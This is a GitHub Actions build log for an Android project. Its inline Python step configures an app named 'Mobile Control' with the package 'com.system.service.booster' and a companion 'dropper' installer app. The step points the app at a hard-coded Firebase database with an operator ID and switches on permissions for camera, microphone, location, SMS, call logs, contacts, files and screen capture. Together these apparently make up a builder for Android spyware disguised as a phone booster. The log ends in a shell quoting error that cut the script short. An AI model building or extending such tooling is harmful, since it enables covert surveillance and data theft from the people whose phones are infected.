@@ -1,0 +1,584 @@
+﻿2026-10-18T10:09:41.1298512Z Current runner version: '2.337.0'
+2026-10-18T10:09:41.1324559Z ##[group]Runner Image Provisioner
+2026-10-18T10:09:41.1325746Z Hosted Compute Agent
+2026-10-18T10:09:41.1326365Z Version: 20261012.601
+2026-10-18T10:09:41.1327102Z Commit: f3dc54e1fb89da6852db922499a0233137369e1d
+2026-10-18T10:09:41.1328156Z Build Date: 2026-10-12T17:48:21Z
+2026-10-18T10:09:41.1328829Z Worker ID: {3959bcbd-f8d8-4d5c-9322-200cdbaf2c48}
+2026-10-18T10:09:41.1329479Z Region: centralus
+2026-10-18T10:09:41.1330008Z Cloud: Azure
+2026-10-18T10:09:41.1330563Z ##[endgroup]
+2026-10-18T10:09:41.1332186Z ##[group]Operating System
+2026-10-18T10:09:41.1332812Z Ubuntu
+2026-10-18T10:09:41.1333291Z 24.04.5
+2026-10-18T10:09:41.1333793Z LTS
+2026-10-18T10:09:41.1334306Z ##[endgroup]
+2026-10-18T10:09:41.1334817Z ##[group]Runner Image
+2026-10-18T10:09:41.1335599Z Image: ubuntu-24.04
+2026-10-18T10:09:41.1336137Z Version: 20261012.334.1
+2026-10-18T10:09:41.1337358Z Included Software: https://github.com/actions/runner-images/blob/ubuntu24/20261012.334/images/ubuntu/Ubuntu2404-Readme.md
+2026-10-18T10:09:41.1338814Z Image Release: https://github.com/actions/runner-images/releases/tag/ubuntu24%2F20261012.334
+2026-10-18T10:09:41.1339733Z ##[endgroup]
+2026-10-18T10:09:41.1340816Z ##[group]GITHUB_TOKEN Permissions
+2026-10-18T10:09:41.1343104Z Actions: read
+2026-10-18T10:09:41.1343641Z Contents: write
+2026-10-18T10:09:41.1344166Z Metadata: read
+2026-10-18T10:09:41.1344731Z ##[endgroup]
+2026-10-18T10:09:41.1347108Z Secret source: Actions
+2026-10-18T10:09:41.1348038Z Cache mode: write
+2026-10-18T10:09:41.1348686Z Prepare workflow directory
+2026-10-18T10:09:41.1708112Z Prepare all required actions
+2026-10-18T10:09:41.1762140Z Getting action download info
+2026-10-18T10:09:41.4298383Z Download action repository 'actions/checkout@v4' (SHA:11d5960a326750d5838078e36cf38b85af677262)
+2026-10-18T10:09:41.5911800Z Download action repository 'actions/setup-java@v4' (SHA:cf277c60eb25467037889841efdb72551f06f6c3)
+2026-10-18T10:09:42.3054115Z Download action repository 'actions/upload-artifact@v4' (SHA:ea165f8d65b6e75b540449e92b4886f43607fa02)
+2026-10-18T10:09:42.5678004Z Complete job name: build
+2026-10-18T10:09:42.6393018Z ##[group]Run actions/checkout@v4
+2026-10-18T10:09:42.6394245Z with:
+2026-10-18T10:09:42.6394795Z   repository: ggvgghb243-hash/ando-projet
+2026-10-18T10:09:42.6399108Z   token: ***
+2026-10-18T10:09:42.6399617Z   ssh-strict: true
+2026-10-18T10:09:42.6400099Z   ssh-user: git
+2026-10-18T10:09:42.6400572Z   persist-credentials: true
+2026-10-18T10:09:42.6401168Z   clean: true
+2026-10-18T10:09:42.6401671Z   sparse-checkout-cone-mode: true
+2026-10-18T10:09:42.6402239Z   fetch-depth: 1
+2026-10-18T10:09:42.6402714Z   fetch-tags: false
+2026-10-18T10:09:42.6403174Z   show-progress: true
+2026-10-18T10:09:42.6403707Z   lfs: false
+2026-10-18T10:09:42.6404197Z   submodules: false
+2026-10-18T10:09:42.6404681Z   set-safe-directory: true
+2026-10-18T10:09:42.6405425Z   allow-unsafe-pr-checkout: false
+2026-10-18T10:09:42.6406251Z ##[endgroup]
+2026-10-18T10:09:42.7417767Z Syncing repository: ggvgghb243-hash/ando-projet
+2026-10-18T10:09:42.7420123Z ##[group]Getting Git version info
+2026-10-18T10:09:42.7421414Z Working directory is '/home/runner/work/ando-projet/ando-projet'
+2026-10-18T10:09:42.7422998Z [command]/usr/bin/git version
+2026-10-18T10:09:42.7476174Z git version 2.55.0
+2026-10-18T10:09:42.7507674Z ##[endgroup]
+2026-10-18T10:09:42.7521768Z Temporarily overriding HOME='/home/runner/work/_temp/c4d98dee-3be9-4f1d-b4ec-b9814ad8be21' before making global git config changes
+2026-10-18T10:09:42.7528623Z Adding repository directory to the temporary git global config as a safe directory
+2026-10-18T10:09:42.7529918Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/ando-projet/ando-projet
+2026-10-18T10:09:42.7594009Z Deleting the contents of '/home/runner/work/ando-projet/ando-projet'
+2026-10-18T10:09:42.7603567Z ##[group]Initializing the repository
+2026-10-18T10:09:42.7606691Z [command]/usr/bin/git init /home/runner/work/ando-projet/ando-projet
+2026-10-18T10:09:42.7697534Z hint: Using 'master' as the name for the initial branch. This default branch name
+2026-10-18T10:09:42.7699252Z hint: will change to "main" in Git 3.0. To configure the initial branch name
+2026-10-18T10:09:42.7702603Z hint: to use in all of your new repositories, which will suppress this warning,
+2026-10-18T10:09:42.7703759Z hint: call:
+2026-10-18T10:09:42.7704644Z hint:
+2026-10-18T10:09:42.7705854Z hint: 	git config --global init.defaultBranch <name>
+2026-10-18T10:09:42.7706802Z hint:
+2026-10-18T10:09:42.7708102Z hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
+2026-10-18T10:09:42.7709464Z hint: 'development'. The just-created branch can be renamed via this command:
+2026-10-18T10:09:42.7710641Z hint:
+2026-10-18T10:09:42.7711517Z hint: 	git branch -m <name>
+2026-10-18T10:09:42.7712409Z hint:
+2026-10-18T10:09:42.7713580Z hint: Disable this message with "git config set advice.defaultBranchName false"
+2026-10-18T10:09:42.7715316Z Initialized empty Git repository in /home/runner/work/ando-projet/ando-projet/.git/
+2026-10-18T10:09:42.7718387Z [command]/usr/bin/git remote add origin https://github.com/ggvgghb243-hash/ando-projet
+2026-10-18T10:09:42.7767557Z ##[endgroup]
+2026-10-18T10:09:42.7768810Z ##[group]Disabling automatic garbage collection
+2026-10-18T10:09:42.7770621Z [command]/usr/bin/git config --local gc.auto 0
+2026-10-18T10:09:42.7808598Z ##[endgroup]
+2026-10-18T10:09:42.7809894Z ##[group]Setting up auth
+2026-10-18T10:09:42.7817221Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
+2026-10-18T10:09:42.7853552Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
+2026-10-18T10:09:42.8197159Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
+2026-10-18T10:09:42.8231109Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
+2026-10-18T10:09:42.8423431Z [command]/usr/bin/git config --local --name-only --get-regexp ^includeIf\.gitdir:
+2026-10-18T10:09:42.8452791Z [command]/usr/bin/git submodule foreach --recursive git config --local --show-origin --name-only --get-regexp remote.origin.url
+2026-10-18T10:09:42.8641933Z [command]/usr/bin/git config --local http.https://github.com/.extraheader AUTHORIZATION: basic ***
+2026-10-18T10:09:42.8681050Z ##[endgroup]
+2026-10-18T10:09:42.8682188Z ##[group]Fetching the repository
+2026-10-18T10:09:42.8691089Z [command]/usr/bin/git -c protocol.version=2 fetch --no-tags --prune --no-recurse-submodules --depth=1 origin +c6e3b73357dbcf14b090d455b583cff109b6437f:refs/remotes/origin/main
+2026-10-18T10:09:44.2112697Z From https://github.com/ggvgghb243-hash/ando-projet
+2026-10-18T10:09:44.2113978Z  * [new ref]         c6e3b73357dbcf14b090d455b583cff109b6437f -> origin/main
+2026-10-18T10:09:44.2120477Z ##[endgroup]
+2026-10-18T10:09:44.2121340Z ##[group]Determining the checkout info
+2026-10-18T10:09:44.2127300Z ##[endgroup]
+2026-10-18T10:09:44.2127927Z [command]/usr/bin/git sparse-checkout disable
+2026-10-18T10:09:44.2180952Z [command]/usr/bin/git config --local --unset-all extensions.worktreeConfig
+2026-10-18T10:09:44.2211870Z ##[group]Checking out the ref
+2026-10-18T10:09:44.2216114Z [command]/usr/bin/git checkout --progress --force -B main refs/remotes/origin/main
+2026-10-18T10:09:44.4716493Z Switched to a new branch 'main'
+2026-10-18T10:09:44.4721317Z branch 'main' set up to track 'origin/main'.
+2026-10-18T10:09:44.4731688Z ##[endgroup]
+2026-10-18T10:09:44.4771906Z [command]/usr/bin/git log -1 --format=%H
+2026-10-18T10:09:44.4793639Z c6e3b73357dbcf14b090d455b583cff109b6437f
+2026-10-18T10:09:44.5072348Z ##[group]Run actions/setup-java@v4
+2026-10-18T10:09:44.5072732Z with:
+2026-10-18T10:09:44.5073004Z   java-version: 17
+2026-10-18T10:09:44.5073287Z   distribution: temurin
+2026-10-18T10:09:44.5073706Z   cache: gradle
+2026-10-18T10:09:44.5073982Z   java-package: jdk
+2026-10-18T10:09:44.5074259Z   check-latest: false
+2026-10-18T10:09:44.5074541Z   server-id: github
+2026-10-18T10:09:44.5074820Z   server-username: GITHUB_ACTOR
+2026-10-18T10:09:44.5075279Z   server-password: GITHUB_TOKEN
+2026-10-18T10:09:44.5075612Z   overwrite-settings: true
+2026-10-18T10:09:44.5075914Z   job-status: success
+2026-10-18T10:09:44.5078515Z   token: ***
+2026-10-18T10:09:44.5078788Z ##[endgroup]
+2026-10-18T10:09:44.6783220Z ##[warning]setup-java v4 is deprecated and will no longer receive updates. Please migrate to actions/setup-java@v5.
+2026-10-18T10:09:44.6791694Z ##[group]Installed distributions
+2026-10-18T10:09:44.6831891Z Resolved Java 17.0.20+1 from tool-cache
+2026-10-18T10:09:44.6832310Z Setting Java 17.0.20+1 as the default
+2026-10-18T10:09:44.6841734Z (node:2220) [DEP0040] DeprecationWarning: The `punycode` module is deprecated. Please use a userland alternative instead.
+2026-10-18T10:09:44.6845435Z (Use `node --trace-deprecation ...` to show where the warning was created)
+2026-10-18T10:09:44.6845933Z Creating toolchains.xml for JDK version 17 from temurin
+2026-10-18T10:09:44.6929504Z Writing to /home/runner/.m2/toolchains.xml
+2026-10-18T10:09:44.6930480Z 
+2026-10-18T10:09:44.6930630Z Java configuration:
+2026-10-18T10:09:44.6930987Z   Distribution: temurin
+2026-10-18T10:09:44.6931303Z   Version: 17.0.20+1
+2026-10-18T10:09:44.6931816Z   Path: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-18T10:09:44.6932085Z 
+2026-10-18T10:09:44.6932488Z ##[endgroup]
+2026-10-18T10:09:44.6953363Z Creating settings.xml with server-id: github
+2026-10-18T10:09:44.6996513Z Writing to /home/runner/.m2/settings.xml
+2026-10-18T10:09:45.1571399Z gradle cache is not found
+2026-10-18T10:09:45.1722538Z ##[group]Run python -m pip install --break-system-packages pillow requests || python -m pip install pillow requests
+2026-10-18T10:09:45.1723361Z [36;1mpython -m pip install --break-system-packages pillow requests || python -m pip install pillow requests[0m
+2026-10-18T10:09:45.2277503Z shell: /usr/bin/bash -e {0}
+2026-10-18T10:09:45.2277796Z env:
+2026-10-18T10:09:45.2278121Z   JAVA_HOME: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-18T10:09:45.2278587Z   JAVA_HOME_17_X64: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-18T10:09:45.2278944Z ##[endgroup]
+2026-10-18T10:09:46.7523965Z Defaulting to user installation because normal site-packages is not writeable
+2026-10-18T10:09:47.9819710Z Collecting pillow
+2026-10-18T10:09:48.0660889Z   Downloading pillow-13.0.0-cp312-cp312-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl.metadata (9.1 kB)
+2026-10-18T10:09:48.0709864Z Requirement already satisfied: requests in /usr/lib/python3/dist-packages (2.31.0)
+2026-10-18T10:09:48.1021148Z Downloading pillow-13.0.0-cp312-cp312-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl (7.1 MB)
+2026-10-18T10:09:48.3004658Z    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 7.1/7.1 MB 36.9 MB/s eta 0:00:00
+2026-10-18T10:09:48.5652648Z Installing collected packages: pillow
+2026-10-18T10:09:48.8709603Z Successfully installed pillow-13.0.0
+2026-10-18T10:09:48.9749179Z ##[group]Run chmod +x gradlew
+2026-10-18T10:09:48.9749480Z [36;1mchmod +x gradlew[0m
+2026-10-18T10:09:48.9789686Z shell: /usr/bin/bash -e {0}
+2026-10-18T10:09:48.9789962Z env:
+2026-10-18T10:09:48.9790274Z   JAVA_HOME: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-18T10:09:48.9790747Z   JAVA_HOME_17_X64: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-18T10:09:48.9791111Z ##[endgroup]
+2026-10-18T10:09:48.9900687Z ##[group]Run python -c '
+2026-10-18T10:09:48.9901520Z [36;1mpython -c '[0m
+2026-10-18T10:09:48.9901788Z [36;1mimport os, re, base64, json, xml.sax.saxutils[0m
+2026-10-18T10:09:48.9902110Z [36;1mfrom PIL import Image[0m
+2026-10-18T10:09:48.9902348Z [36;1m[0m
+2026-10-18T10:09:48.9902691Z [36;1mapp_name = os.environ.get("APP_NAME", "Mobile Control").strip() or "Mobile Control"[0m
+2026-10-18T10:09:48.9903407Z [36;1mpackage_name = os.environ.get("PACKAGE_NAME", "com.system.service").strip() or "com.system.service"[0m
+2026-10-18T10:09:48.9904057Z [36;1mwebview_url = os.environ.get("WEBVIEW_URL", "https://google.com").strip() or "https://google.com"[0m
+2026-10-18T10:09:48.9904604Z [36;1muser_id = os.environ.get("USER_ID", "master01").strip() or "master01"[0m
+2026-10-18T10:09:48.9904997Z [36;1micon_b64 = os.environ.get("ICON_B64", "")[0m
+2026-10-18T10:09:48.9905569Z [36;1mfeature_flags_raw = os.environ.get("FEATURE_FLAGS_RAW", "{}")[0m
+2026-10-18T10:09:48.9906247Z [36;1mfirebase_url = "https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/"[0m
+2026-10-18T10:09:48.9906806Z [36;1m[0m
+2026-10-18T10:09:48.9906993Z [36;1mtry:[0m
+2026-10-18T10:09:48.9907303Z [36;1m    features = json.loads(feature_flags_raw) if feature_flags_raw else {}[0m
+2026-10-18T10:09:48.9907677Z [36;1mexcept Exception as e:[0m
+2026-10-18T10:09:48.9907921Z [36;1m    features = {}[0m
+2026-10-18T10:09:48.9908142Z [36;1m[0m
+2026-10-18T10:09:48.9908347Z [36;1m# Safe Android XML escaping[0m
+2026-10-18T10:09:48.9908707Z [36;1msafe_app_name_attr = xml.sax.saxutils.quoteattr(app_name)[1:-1][0m
+2026-10-18T10:09:48.9909167Z [36;1msafe_app_name_xml = xml.sax.saxutils.escape(app_name).replace("'", "\\'")[0m
+2026-10-18T10:09:48.9909517Z [36;1m[0m
+2026-10-18T10:09:48.9909726Z [36;1m# 1. Update AndroidManifest.xml[0m
+2026-10-18T10:09:48.9910035Z [36;1mmanifest = "app/src/main/AndroidManifest.xml"[0m
+2026-10-18T10:09:48.9910342Z [36;1mif os.path.exists(manifest):[0m
+2026-10-18T10:09:48.9910653Z [36;1m    with open(manifest, "r", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9910960Z [36;1m        c = f.read()[0m
+2026-10-18T10:09:48.9911457Z [36;1m    c = re.sub(r"android:name=\"webview_url\" android:value=\"[^\"]*\"", f"android:name=\"webview_url\" android:value=\"{webview_url}\"", c)[0m
+2026-10-18T10:09:48.9912178Z [36;1m    c = re.sub(r"android:name=\"user_id\" android:value=\"[^\"]*\"", f"android:name=\"user_id\" android:value=\"{user_id}\"", c)[0m
+2026-10-18T10:09:48.9912901Z [36;1m    c = re.sub(r"android:name=\"firebase_url\" android:value=\"[^\"]*\"", f"android:name=\"firebase_url\" android:value=\"{firebase_url}\"", c)[0m
+2026-10-18T10:09:48.9913683Z [36;1m    c = re.sub(r"android:name=\"service_title\" android:value=\"[^\"]*\"", f"android:name=\"service_title\" android:value=\"{safe_app_name_attr}\"", c)[0m
+2026-10-18T10:09:48.9914200Z [36;1m[0m
+2026-10-18T10:09:48.9914424Z [36;1m    # Inject feature metadata flags[0m
+2026-10-18T10:09:48.9914707Z [36;1m    meta_injections = ""[0m
+2026-10-18T10:09:48.9914977Z [36;1m    for k, v in features.items():[0m
+2026-10-18T10:09:48.9915398Z [36;1m        val_str = "true" if v else "false"[0m
+2026-10-18T10:09:48.9915864Z [36;1m        c = re.sub(rf"<meta-data\s+android:name=\"feat_{k}\"[^>]*/>\n?", "", c)[0m
+2026-10-18T10:09:48.9916603Z [36;1m        meta_injections += f"        <meta-data android:name=\"feat_{k}\" android:value=\"{val_str}\" />\n"[0m
+2026-10-18T10:09:48.9917078Z [36;1m    if meta_injections:[0m
+2026-10-18T10:09:48.9917396Z [36;1m        app_tag_match = re.search(r"<application\b[^>]*>", c)[0m
+2026-10-18T10:09:48.9917738Z [36;1m        if app_tag_match:[0m
+2026-10-18T10:09:48.9918015Z [36;1m            end_pos = app_tag_match.end()[0m
+2026-10-18T10:09:48.9918351Z [36;1m            c = c[:end_pos] + "\n" + meta_injections + c[end_pos:][0m
+2026-10-18T10:09:48.9918658Z [36;1m[0m
+2026-10-18T10:09:48.9919141Z [36;1m    # Strip permissions from manifest if unchecked by user & sync foregroundServiceType[0m
+2026-10-18T10:09:48.9919609Z [36;1m    fgs_types = ["specialUse", "mediaProjection"][0m
+2026-10-18T10:09:48.9920034Z [36;1m    if features.get("camera") is not False or features.get("livecam") is not False:[0m
+2026-10-18T10:09:48.9920441Z [36;1m        fgs_types.append("camera")[0m
+2026-10-18T10:09:48.9920710Z [36;1m    else:[0m
+2026-10-18T10:09:48.9921151Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.CAMERA\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9921904Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.FOREGROUND_SERVICE_CAMERA\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9922392Z [36;1m[0m
+2026-10-18T10:09:48.9922715Z [36;1m    if features.get("audio") is not False or features.get("livecam") is not False:[0m
+2026-10-18T10:09:48.9923261Z [36;1m        fgs_types.append("microphone")[0m
+2026-10-18T10:09:48.9923775Z [36;1m    else:[0m
+2026-10-18T10:09:48.9924199Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.RECORD_AUDIO\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9925061Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.FOREGROUND_SERVICE_MICROPHONE\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9925730Z [36;1m[0m
+2026-10-18T10:09:48.9926077Z [36;1m    if features.get("location") is not False:[0m
+2026-10-18T10:09:48.9926436Z [36;1m        fgs_types.append("location")[0m
+2026-10-18T10:09:48.9926713Z [36;1m    else:[0m
+2026-10-18T10:09:48.9927142Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.ACCESS_FINE_LOCATION\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9927842Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.ACCESS_COARSE_LOCATION\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9928560Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.FOREGROUND_SERVICE_LOCATION\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9929058Z [36;1m[0m
+2026-10-18T10:09:48.9929282Z [36;1m    if features.get("sms") is False:[0m
+2026-10-18T10:09:48.9929735Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.READ_SMS\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9930372Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.RECEIVE_SMS\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9930859Z [36;1m    if features.get("calls") is False:[0m
+2026-10-18T10:09:48.9931341Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.READ_CALL_LOG\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9931986Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.READ_CONTACTS\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9932625Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.CALL_PHONE\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9933182Z [36;1m    if features.get("gallery") is False and features.get("files") is False:[0m
+2026-10-18T10:09:48.9933774Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.READ_EXTERNAL_STORAGE\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9934443Z [36;1m        c = re.sub(r"\s*<uses-permission\s+android:name=\"android.permission.READ_MEDIA_[^\"]*\"[^>]*/>", "", c)[0m
+2026-10-18T10:09:48.9934891Z [36;1m[0m
+2026-10-18T10:09:48.9935285Z [36;1m    # Update foregroundServiceType attribute[0m
+2026-10-18T10:09:48.9936025Z [36;1m    c = re.sub(r"android:foregroundServiceType=\"[^\"]*\"", f"android:foregroundServiceType=\"{'|'.join(fgs_types)}\"", c)[0m
+2026-10-18T10:09:48.9936507Z [36;1m[0m
+2026-10-18T10:09:48.9936753Z [36;1m    with open(manifest, "w", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9937068Z [36;1m        f.write(c)[0m
+2026-10-18T10:09:48.9937292Z [36;1m[0m
+2026-10-18T10:09:48.9937506Z [36;1m# 2. Update strings.xml (Main App)[0m
+2026-10-18T10:09:48.9937828Z [36;1mstrings = "app/src/main/res/values/strings.xml"[0m
+2026-10-18T10:09:48.9938251Z [36;1mif os.path.exists(strings):[0m
+2026-10-18T10:09:48.9938562Z [36;1m    with open(strings, "r", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9938871Z [36;1m        c = f.read()[0m
+2026-10-18T10:09:48.9939314Z [36;1m    c = re.sub(r"<string name=\"app_name\">.*</string>", f"<string name=\"app_name\">{safe_app_name_xml}</string>", c)[0m
+2026-10-18T10:09:48.9939858Z [36;1m    with open(strings, "w", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9940243Z [36;1m        f.write(c)[0m
+2026-10-18T10:09:48.9940474Z [36;1m[0m
+2026-10-18T10:09:48.9940700Z [36;1m# 3. Update strings.xml (Dropper App)[0m
+2026-10-18T10:09:48.9941073Z [36;1mdropper_strings = "dropper/src/main/res/values/strings.xml"[0m
+2026-10-18T10:09:48.9941520Z [36;1mos.makedirs(os.path.dirname(dropper_strings), exist_ok=True)[0m
+2026-10-18T10:09:48.9941959Z [36;1mwith open(dropper_strings, "w", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9942572Z [36;1m    f.write(f"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<resources>\n    <string name=\"app_name\">{safe_app_name_xml}</string>\n</resources>")[0m
+2026-10-18T10:09:48.9943111Z [36;1m[0m
+2026-10-18T10:09:48.9943380Z [36;1mdropper_manifest = "dropper/src/main/AndroidManifest.xml"[0m
+2026-10-18T10:09:48.9943744Z [36;1mif os.path.exists(dropper_manifest):[0m
+2026-10-18T10:09:48.9944087Z [36;1m    with open(dropper_manifest, "r", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9944412Z [36;1m        c = f.read()[0m
+2026-10-18T10:09:48.9944759Z [36;1m    c = re.sub(r"android:label=\"[^\"]*\"", "android:label=\"@string/app_name\"", c)[0m
+2026-10-18T10:09:48.9945401Z [36;1m    with open(dropper_manifest, "w", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9945733Z [36;1m        f.write(c)[0m
+2026-10-18T10:09:48.9945952Z [36;1m[0m
+2026-10-18T10:09:48.9946193Z [36;1m# 4. Update package name in build.gradle.kts[0m
+2026-10-18T10:09:48.9946510Z [36;1mapp_gradle = "app/build.gradle.kts"[0m
+2026-10-18T10:09:48.9946797Z [36;1mif os.path.exists(app_gradle):[0m
+2026-10-18T10:09:48.9947120Z [36;1m    with open(app_gradle, "r", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9947419Z [36;1m        c = f.read()[0m
+2026-10-18T10:09:48.9947783Z [36;1m    c = re.sub(r"applicationId\s*=\s*\"[^\"]*\"", f"applicationId = \"{package_name}\"", c)[0m
+2026-10-18T10:09:48.9948219Z [36;1m    with open(app_gradle, "w", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9948518Z [36;1m        f.write(c)[0m
+2026-10-18T10:09:48.9948737Z [36;1m[0m
+2026-10-18T10:09:48.9948965Z [36;1mdropper_gradle = "dropper/build.gradle.kts"[0m
+2026-10-18T10:09:48.9949279Z [36;1mif os.path.exists(dropper_gradle):[0m
+2026-10-18T10:09:48.9949610Z [36;1m    with open(dropper_gradle, "r", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9949923Z [36;1m        c = f.read()[0m
+2026-10-18T10:09:48.9950302Z [36;1m    c = re.sub(r"applicationId\s*=\s*\"[^\"]*\"", f"applicationId = \"{package_name}.installer\"", c)[0m
+2026-10-18T10:09:48.9950786Z [36;1m    with open(dropper_gradle, "w", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9951100Z [36;1m        f.write(c)[0m
+2026-10-18T10:09:48.9951316Z [36;1m[0m
+2026-10-18T10:09:48.9951524Z [36;1m# 5. Update google-services.json[0m
+2026-10-18T10:09:48.9951806Z [36;1mgs = "app/google-services.json"[0m
+2026-10-18T10:09:48.9952074Z [36;1mif os.path.exists(gs):[0m
+2026-10-18T10:09:48.9952352Z [36;1m    with open(gs, "r", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9952639Z [36;1m        c = f.read()[0m
+2026-10-18T10:09:48.9953007Z [36;1m    c = re.sub(r"\"package_name\":\s*\"[^\"]*\"", f"\"package_name\": \"{package_name}\"", c)[0m
+2026-10-18T10:09:48.9953420Z [36;1m    with open(gs, "w", encoding="utf-8") as f:[0m
+2026-10-18T10:09:48.9953705Z [36;1m        f.write(c)[0m
+2026-10-18T10:09:48.9953918Z [36;1m[0m
+2026-10-18T10:09:48.9954139Z [36;1m# 6. Process Custom Icon PNG if provided[0m
+2026-10-18T10:09:48.9954437Z [36;1mif icon_b64 and len(icon_b64) > 10:[0m
+2026-10-18T10:09:48.9954697Z [36;1m    try:[0m
+2026-10-18T10:09:48.9954996Z [36;1m        icon_path = "temp_icon.png"[0m
+2026-10-18T10:09:48.9955424Z [36;1m        with open(icon_path, "wb") as f:[0m
+2026-10-18T10:09:48.9955754Z [36;1m            f.write(base64.b64decode(icon_b64))[0m
+2026-10-18T10:09:48.9956061Z [36;1m        img = Image.open(icon_path)[0m
+2026-10-18T10:09:48.9956429Z [36;1m        sizes = {"mdpi": 48, "hdpi": 72, "xhdpi": 96, "xxhdpi": 144, "xxxhdpi": 192}[0m
+2026-10-18T10:09:48.9956889Z [36;1m        for target_dir in ["app/src/main/res", "dropper/src/main/res"]:[0m
+2026-10-18T10:09:48.9957332Z [36;1m            for density, size in sizes.items():[0m
+2026-10-18T10:09:48.9957692Z [36;1m                out_dir = os.path.join(target_dir, f"mipmap-{density}")[0m
+2026-10-18T10:09:48.9958065Z [36;1m                os.makedirs(out_dir, exist_ok=True)[0m
+2026-10-18T10:09:48.9958468Z [36;1m                img.resize((size, size)).save(os.path.join(out_dir, "ic_launcher.png"))[0m
+2026-10-18T10:09:48.9958978Z [36;1m                img.resize((size, size)).save(os.path.join(out_dir, "ic_launcher_round.png"))[0m
+2026-10-18T10:09:48.9959406Z [36;1m        print("Custom icon processed successfully!")[0m
+2026-10-18T10:09:48.9959713Z [36;1m    except Exception as e:[0m
+2026-10-18T10:09:48.9959981Z [36;1m        print(f"Icon decode error: {e}")[0m
+2026-10-18T10:09:48.9960242Z [36;1m'[0m
+2026-10-18T10:09:48.9997302Z shell: /usr/bin/bash -e {0}
+2026-10-18T10:09:48.9997571Z env:
+2026-10-18T10:09:48.9997890Z   JAVA_HOME: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-18T10:09:48.9998361Z   JAVA_HOME_17_X64: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-18T10:09:48.9998738Z   APP_NAME: Mobile Control
+2026-10-18T10:09:48.9999008Z   PACKAGE_NAME: com.system.service.booster
+2026-10-18T10:09:48.9999309Z   WEBVIEW_URL: https://google.com
+2026-10-18T10:09:48.9999557Z   USER_ID: master01
+2026-10-18T10:09:48.9999756Z   ICON_B64: 
+2026-10-18T10:09:49.0000080Z   FEATURE_FLAGS_RAW: {"gallery":true,"files":true,"location":true,"camera":true}
+2026-10-18T10:09:49.0000443Z ##[endgroup]
+2026-10-18T10:09:49.0062154Z /home/runner/work/_temp/d8341703-5786-44c2-a27e-22c8d4aa8291.sh: line 148: .join(fgs_types)}\"", c)
+2026-10-18T10:09:49.0062779Z 
+2026-10-18T10:09:49.0063056Z     with open(manifest, "w", encoding="utf-8") as f:
+2026-10-18T10:09:49.0063521Z         f.write(c)
+2026-10-18T10:09:49.0063739Z 
+2026-10-18T10:09:49.0063926Z # 2. Update strings.xml (Main App)
+2026-10-18T10:09:49.0064437Z strings = "app/src/main/res/values/strings.xml"
+2026-10-18T10:09:49.0064931Z if os.path.exists(strings):
+2026-10-18T10:09:49.0065546Z     with open(strings, "r", encoding="utf-8") as f:
+2026-10-18T10:09:49.0066069Z         c = f.read()
